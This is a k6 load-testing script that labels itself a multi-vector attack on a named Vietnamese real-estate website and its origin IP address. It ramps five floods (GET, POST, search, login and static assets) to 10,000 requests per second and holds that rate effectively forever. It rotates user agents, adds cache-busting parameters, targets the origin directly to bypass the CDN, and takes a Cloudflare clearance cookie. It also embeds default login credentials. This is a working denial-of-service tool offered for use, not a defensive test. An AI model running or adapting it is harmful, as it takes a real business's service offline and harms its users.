import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

/* ==================================================================
   K6 MULTI-VECTOR ATTACK - thanhhuyreal.com
   Tổng hợp tất cả phương thức tấn công vào 1 script duy nhất
   
   Vectors:
   1. HTTP GET Flood (random params bypass cache)
   2. HTTP POST Flood (API endpoints)
   3. Login Flood (CSRF + credentials)
   4. Search Flood (heavy DB queries)
   5. Static Asset Flood (CSS/JS/images)
   6. Random URL Flood (bypass CDN)
   
   Chạy song song tất cả vectors để tạo tải tổng hợp tối đa
   ================================================================== */

const BASE_URL = (__ENV.BASE_URL || 'https://thanhhuyreal.com').replace(/\/+$/, '');
const IP_URL = (__ENV.IP_URL || 'http://103.211.206.175').replace(/\/+$/, '');
const USE_IP = (__ENV.USE_IP || 'true').toLowerCase() === 'true';

const TARGET = USE_IP ? IP_URL : BASE_URL;
const HOST = 'thanhhuyreal.com';

// Credentials
const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
const PASSWORD = __ENV.PHP_PASSWORD || 'lonussystem123@';
const CF_CLEARANCE = __ENV.CF_CLEARANCE || '';

// ===== Parse STAGES =====
const STAGES_RAW = __ENV.STAGES || '30s:1000,60s:5000,120s:10000,876000h:10000';
const STAGES = STAGES_RAW.split(',').map(p => {
  const [d, t] = p.trim().split(':');
  return { duration: d.trim(), target: parseInt(t, 10) };
});

const START_RATE = parseInt(__ENV.START_RATE || '500', 10);
const PRE_VUS = parseInt(__ENV.PRE_VUS || '1000', 10);
const MAX_VUS = parseInt(__ENV.MAX_VUS || '15000', 10);
const TIMEOUT = __ENV.REQUEST_TIMEOUT || '30s';

// ===== Metrics =====
const totalRequests = new Counter('total_requests');
const successRequests = new Counter('success_requests');
const failedRequests = new Counter('failed_requests');
const errorRate = new Rate('error_rate');
const reqDuration = new Trend('request_duration');

// Scenario-specific counters
const getFlood = new Counter('get_flood_count');
const postFlood = new Counter('post_flood_count');
const loginFlood = new Counter('login_flood_count');
const searchFlood = new Counter('search_flood_count');
const staticFlood = new Counter('static_flood_count');

// ===== Endpoints =====

// 1. Heavy GET pages (bypass cache with random params)
const GET_ENDPOINTS = [
  () => `${TARGET}/?_=${Date.now()}&rand=${randomIntBetween(1, 999999)}`,
  () => `${TARGET}/nha-dat-ban?page=${randomIntBetween(1, 200)}&_=${Date.now()}`,
  () => `${TARGET}/nha-dat-cho-thue?page=${randomIntBetween(1, 150)}&_=${Date.now()}`,
  () => `${TARGET}/can-ho-chung-cu?page=${randomIntBetween(1, 100)}&_=${Date.now()}`,
  () => `${TARGET}/dat-nen?page=${randomIntBetween(1, 100)}&_=${Date.now()}`,
  () => `${TARGET}/bat-dong-san/${randomIntBetween(1, 10000)}?_=${Date.now()}`,
  () => `${TARGET}/tin-tuc/${randomIntBetween(1, 5000)}?_=${Date.now()}`,
  () => `${TARGET}/lien-he?_=${Date.now()}`,
];

// 2. Heavy POST APIs (database intensive)
const POST_ENDPOINTS = [
  {
    url: () => `${TARGET}/model/search`,
    body: () => `q=${randomItem(['nhà', 'đất', 'chung cư', 'biệt thự'])}&page=${randomIntBetween(1, 100)}&_=${Date.now()}`,
  },
  {
    url: () => `${TARGET}/model/listings`,
    body: () => `page=${randomIntBetween(1, 100)}&limit=50&sort=${randomItem(['newest', 'price_asc', 'price_desc'])}&_=${Date.now()}`,
  },
  {
    url: () => `${TARGET}/model/filter`,
    body: () => `loai=${randomIntBetween(1, 5)}&gia_tu=${randomIntBetween(1, 20) * 500}&gia_den=${randomIntBetween(20, 100) * 1000}&_=${Date.now()}`,
  },
  {
    url: () => `${TARGET}/model/get-listings`,
    body: () => `province=${randomIntBetween(1, 63)}&district=${randomIntBetween(1, 300)}&type=${randomIntBetween(1, 5)}&_=${Date.now()}`,
  },
];

// 3. Search queries (heaviest DB load)
const SEARCH_QUERIES = [
  'nhà đất hà nội',
  'chung cư giá rẻ',
  'biệt thự ven đô',
  'đất nền dự án',
  'can ho cao cap',
  'bat dong san binh duong',
  'nha pho thuong mai',
  'dat nen khu cong nghiep',
];

// 4. Static assets (high volume, low server load but consumes bandwidth)
const STATIC_ASSETS = [
  '/assets/css/style.css',
  '/assets/js/main.js',
  '/assets/js/app.js',
  '/assets/images/logo.png',
  '/assets/images/banner.jpg',
  '/assets/fonts/roboto.woff2',
  '/assets/icons/favicon.ico',
  '/robots.txt',
  '/sitemap.xml',
];

// ===== Helper Functions =====

function makeHeaders(extra = {}) {
  const headers = {
    'User-Agent': randomItem([
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    ]),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
  };

  // Add Host header if hitting IP directly
  if (USE_IP) {
    headers['Host'] = HOST;
  }

  // Add Cloudflare bypass if provided
  if (CF_CLEARANCE && !USE_IP) {
    headers['Cookie'] = `cf_clearance=${CF_CLEARANCE}`;
  }

  return Object.assign({}, headers, extra);
}

function makeApiHeaders(session) {
  return makeHeaders({
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
  });
}

// ===== Scenarios =====

export const options = {
  discardResponseBodies: true,
  scenarios: {
    // Scenario 1: HTTP GET Flood (40% traffic)
    get_flood: {
      executor: 'ramping-arrival-rate',
      startRate: Math.floor(START_RATE * 0.4),
      timeUnit: '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.4),
      maxVUs: Math.floor(MAX_VUS * 0.4),
      stages: STAGES,
      exec: 'attackGet',
    },

    // Scenario 2: HTTP POST Flood (25% traffic)
    post_flood: {
      executor: 'ramping-arrival-rate',
      startRate: Math.floor(START_RATE * 0.25),
      timeUnit: '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.25),
      maxVUs: Math.floor(MAX_VUS * 0.25),
      stages: STAGES,
      exec: 'attackPost',
    },

    // Scenario 3: Search Flood (20% traffic - heaviest)
    search_flood: {
      executor: 'ramping-arrival-rate',
      startRate: Math.floor(START_RATE * 0.2),
      timeUnit: '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.2),
      maxVUs: Math.floor(MAX_VUS * 0.2),
      stages: STAGES,
      exec: 'attackSearch',
    },

    // Scenario 4: Login Flood (10% traffic)
    login_flood: {
      executor: 'ramping-arrival-rate',
      startRate: Math.floor(START_RATE * 0.1),
      timeUnit: '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.1),
      maxVUs: Math.floor(MAX_VUS * 0.1),
      stages: STAGES,
      exec: 'attackLogin',
    },

    // Scenario 5: Static Asset Flood (5% traffic)
    static_flood: {
      executor: 'ramping-arrival-rate',
      startRate: Math.floor(START_RATE * 0.05),
      timeUnit: '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.05),
      maxVUs: Math.floor(MAX_VUS * 0.05),
      stages: STAGES,
      exec: 'attackStatic',
    },
  },
  thresholds: {
    error_rate: ['rate<0.95'], // Allow up to 95% errors (stress test)
    request_duration: ['p(95)<30000'], // 95% of requests < 30s
  },
};

// ===== Attack Functions =====

export function attackGet() {
  const fn = randomItem(GET_ENDPOINTS);
  const url = fn();
  const res = http.get(url, {
    headers: makeHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'get_flood' },
  });

  recordMetrics(res, getFlood);
}

export function attackPost() {
  const endpoint = randomItem(POST_ENDPOINTS);
  const url = endpoint.url();
  const body = endpoint.body();
  
  const res = http.post(url, body, {
    headers: makeApiHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'post_flood' },
  });

  recordMetrics(res, postFlood);
}

export function attackSearch() {
  const query = randomItem(SEARCH_QUERIES);
  const page = randomIntBetween(1, 200);
  const sort = randomItem(['relevance', 'newest', 'price_asc', 'price_desc']);
  
  const url = `${TARGET}/tim-kiem?q=${encodeURIComponent(query)}&page=${page}&sort=${sort}&_=${Date.now()}`;
  
  const res = http.get(url, {
    headers: makeHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'search_flood' },
  });

  recordMetrics(res, searchFlood);
}

export function attackLogin() {
  // Step 1: GET login page to get CSRF
  const loginPageUrl = `${TARGET}/?auth=login&_=${Date.now()}`;
  const loginPageRes = http.get(loginPageUrl, {
    headers: makeHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'login_flood', step: 'get_csrf' },
  });

  // Extract CSRF token (simplified - may not work on all sites)
  const csrfMatch = loginPageRes.body ? loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/) : null;
  const csrfToken = csrfMatch ? csrfMatch[1] : '';

  // Step 2: POST login
  const loginUrl = `${TARGET}/model/login`;
  const loginBody = `csrf_token=${encodeURIComponent(csrfToken)}&identifier=${encodeURIComponent(IDENTIFIER)}&password=${encodeURIComponent(PASSWORD)}`;

  const loginRes = http.post(loginUrl, loginBody, {
    headers: makeApiHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'login_flood', step: 'post_login' },
  });

  recordMetrics(loginRes, loginFlood);
}

export function attackStatic() {
  const asset = randomItem(STATIC_ASSETS);
  const url = `${TARGET}${asset}?_=${Date.now()}`;
  
  const res = http.get(url, {
    headers: makeHeaders(),
    timeout: TIMEOUT,
    tags: { scenario: 'static_flood' },
  });

  recordMetrics(res, staticFlood);
}

function recordMetrics(res, counter) {
  const s = res.status;
  const success = s >= 200 && s < 400;
  const failed = s === 0 || s >= 500;

  totalRequests.add(1);
  counter.add(1);
  reqDuration.add(res.timings.duration);
  
  if (success) {
    successRequests.add(1);
  } else {
    failedRequests.add(1);
  }

  errorRate.add(failed);

  check(res, {
    'status not 5xx': (r) => r.status < 500,
    'not timeout': (r) => r.status !== 0,
  });
}

// Export setup if needed
export function setup() {
  console.log(`Starting Multi-Vector Attack on ${TARGET}`);
  console.log(`Max VUs: ${MAX_VUS}, Start Rate: ${START_RATE}/s`);
  console.log(`Mode: ${USE_IP ? 'Direct IP' : 'Domain (Cloudflare)'}`);
}
